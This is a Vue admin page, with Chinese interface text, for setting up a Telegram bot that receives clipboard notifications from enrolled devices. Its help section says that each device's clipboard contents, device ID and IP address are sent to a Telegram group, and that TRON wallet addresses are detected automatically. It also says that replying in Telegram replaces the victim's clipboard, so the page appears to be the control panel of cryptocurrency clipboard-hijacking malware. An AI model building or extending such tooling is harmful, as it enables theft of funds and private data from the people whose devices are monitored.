<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { getSettings, updateSetting, testTelegram } from '../api'
import { ElMessage, ElMessageBox } from 'element-plus'

type Setting = {
  id: number
  key: string
  value: string
  description: string
  created_at: number
  updated_at: number
}

const settings = ref<Setting[]>([])
const loading = ref(false)
const saving = ref(false)

// 表单数据
const formData = ref({
  tg_bot_token: '',
  tg_chat_id: ''
})

// 加载设置
const loadSettings = async () => {
  loading.value = true
  try {
    const { data } = await getSettings()
    settings.value = data.settings
    
    // 填充表单数据
    data.settings.forEach((setting: Setting) => {
      if (setting.key === 'tg_bot_token') {
        formData.value.tg_bot_token = setting.value || ''
      } else if (setting.key === 'tg_chat_id') {
        formData.value.tg_chat_id = setting.value || ''
      }
    })
  } catch (error) {
    ElMessage.error('加载设置失败')
  } finally {
    loading.value = false
  }
}

// 保存设置
const saveSettings = async () => {
  try {
    await ElMessageBox.confirm(
      '确定要保存Telegram机器人设置吗？',
      '确认保存',
      {
        confirmButtonText: '保存',
        cancelButtonText: '取消',
        type: 'warning'
      }
    )
    
    saving.value = true
    
    // 保存两个设置
    await updateSetting('tg_bot_token', formData.value.tg_bot_token)
    await updateSetting('tg_chat_id', formData.value.tg_chat_id)
    
    ElMessage.success('设置保存成功')
    await loadSettings() // 重新加载
  } catch (error: any) {
    if (error !== 'cancel') {
      ElMessage.error('保存设置失败')
    }
  } finally {
    saving.value = false
  }
}

// 测试连接
const testConnection = async () => {
  if (!formData.value.tg_bot_token || !formData.value.tg_chat_id) {
    ElMessage.warning('请先填写机器人Token和群组ID')
    return
  }
  
  const loading = ElMessage({
    message: '正在测试连接...',
    type: 'info',
    duration: 0
  })
  
  try {
    const { data } = await testTelegram()
    loading.close()
    
    if (data.ok) {
      ElMessage.success(data.message)
    } else {
      ElMessage.error(data.message)
    }
  } catch (error) {
    loading.close()
    ElMessage.error('测试连接失败')
  }
}

onMounted(() => {
  loadSettings()
})
</script>

<template>
  <div class="telegram-container">
    <!-- 页面标题 -->
    <div class="page-header">
      <h2 class="page-title">Telegram机器人管理</h2>
      <p class="page-subtitle">配置Telegram机器人以接收剪贴板通知</p>
    </div>

    <!-- 设置表单 -->
    <el-card class="settings-card" v-loading="loading">
      <el-form :model="formData" label-width="140px" label-position="left">
        <!-- Bot Token -->
        <el-form-item label="机器人Token" prop="tg_bot_token">
          <el-input 
            v-model="formData.tg_bot_token" 
            placeholder="请输入Telegram Bot Token"
            show-password
            clearable
          />
          <div class="form-tip">
            从 <a href="https://t.me/BotFather" target="_blank">@BotFather</a> 获取的机器人Token
          </div>
        </el-form-item>

        <!-- Chat ID -->
        <el-form-item label="群组/频道ID" prop="tg_chat_id">
          <el-input 
            v-model="formData.tg_chat_id" 
            placeholder="请输入Telegram群组或频道ID"
            clearable
          />
          <div class="form-tip">
            Telegram群组或频道的ID，如 -1001234567890
          </div>
        </el-form-item>

        <!-- 操作按钮 -->
        <el-form-item>
          <el-button type="primary" @click="saveSettings" :loading="saving">
            保存设置
          </el-button>
          <el-button @click="testConnection">
            测试连接
          </el-button>
          <el-button @click="loadSettings">
            刷新
          </el-button>
        </el-form-item>
      </el-form>
    </el-card>

    <!-- 使用说明 -->
    <el-card class="help-card">
      <template #header>
        <div class="card-header">
          <span>使用说明</span>
        </div>
      </template>
      <div class="help-content">
        <h4>如何获取机器人Token？</h4>
        <ol>
          <li>在Telegram中搜索 <code>@BotFather</code></li>
          <li>发送 <code>/newbot</code> 创建新机器人</li>
          <li>按照提示设置机器人名称和用户名</li>
          <li>获取到形如 <code>123456789:ABCdefGHIjklMNOpqrsTUVwxyz</code> 的Token</li>
        </ol>

        <h4>如何获取群组/频道ID？</h4>
        <ol>
          <li>将机器人添加到群组或频道（需要管理员权限）</li>
          <li>在群组中发送任意消息</li>
          <li>访问 <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code></li>
          <li>在返回的JSON中找到 <code>chat.id</code> 字段</li>
        </ol>

        <h4>功能说明</h4>
        <ul>
          <li>配置后，设备的剪贴板内容变化将通过机器人发送到指定群组</li>
          <li>支持文本内容的实时同步通知</li>
          <li>可以在群组中查看所有设备的剪贴板历史</li>
          <li><strong>TRON地址检测</strong>：自动识别剪贴板中的TRON地址并发送通知</li>
          <li>通知包含设备ID、IP地址、备注和剪贴板内容</li>
          <li>支持在Telegram中直接回复消息来替换剪贴板内容</li>
        </ul>
      </div>
    </el-card>

    <!-- 最近更新信息 -->
    <el-card 
      v-if="settings.length > 0" 
      class="info-card"
    >
      <template #header>
        <div class="card-header">
          <span>设置信息</span>
        </div>
      </template>
      <el-descriptions :column="1" border>
        <el-descriptions-item 
          v-for="setting in settings.filter(s => ['tg_bot_token', 'tg_chat_id'].includes(s.key))"
          :key="setting.key"
          :label="setting.description"
        >
          <el-tag v-if="setting.value" type="success">已配置</el-tag>
          <el-tag v-else type="info">未配置</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="最后更新时间">
          {{ new Date(Math.max(...settings.map(s => s.updated_at)) * 1000).toLocaleString() }}
        </el-descriptions-item>
      </el-descriptions>
    </el-card>
  </div>
</template>

<style scoped>
.telegram-container {
  max-width: 1000px;
  margin: 0 auto;
  padding: 0 24px;
  width: 100%;
  box-sizing: border-box;
}

/* 页面头部 */
.page-header {
  margin-bottom: 24px;
}

.page-title {
  font-size: 28px;
  font-weight: 700;
  color: var(--text-primary);
  margin: 0 0 8px;
}

.page-subtitle {
  font-size: 14px;
  color: var(--text-secondary);
  margin: 0;
}

/* 设置卡片 */
.settings-card {
  margin-bottom: 24px;
}

:deep(.el-form-item) {
  margin-bottom: 24px;
}

.form-tip {
  font-size: 12px;
  color: var(--text-secondary);
  margin-top: 8px;
  line-height: 1.5;
}

.form-tip a {
  color: var(--primary-color);
  text-decoration: none;
}

.form-tip a:hover {
  text-decoration: underline;
}

/* 帮助卡片 */
.help-card {
  margin-bottom: 24px;
}

.card-header {
  display: flex;
  align-items: center;
  font-weight: 600;
  color: var(--text-primary);
}

.help-content {
  line-height: 1.8;
}

.help-content h4 {
  color: var(--text-primary);
  margin: 20px 0 12px;
  font-size: 16px;
}

.help-content h4:first-child {
  margin-top: 0;
}

.help-content ol,
.help-content ul {
  margin: 0;
  padding-left: 24px;
  color: var(--text-regular);
}

.help-content li {
  margin: 8px 0;
}

.help-content code {
  background-color: var(--bg-page);
  padding: 2px 6px;
  border-radius: 4px;
  font-family: monospace;
  font-size: 13px;
  color: var(--primary-color);
}

/* 信息卡片 */
.info-card {
  margin-bottom: 24px;
}

/* 响应式设计 */
@media (max-width: 768px) {
  .telegram-container {
    padding: 0 12px;
  }
  
  :deep(.el-form) {
    .el-form-item__label {
      width: 100px !important;
    }
  }
}
</style>
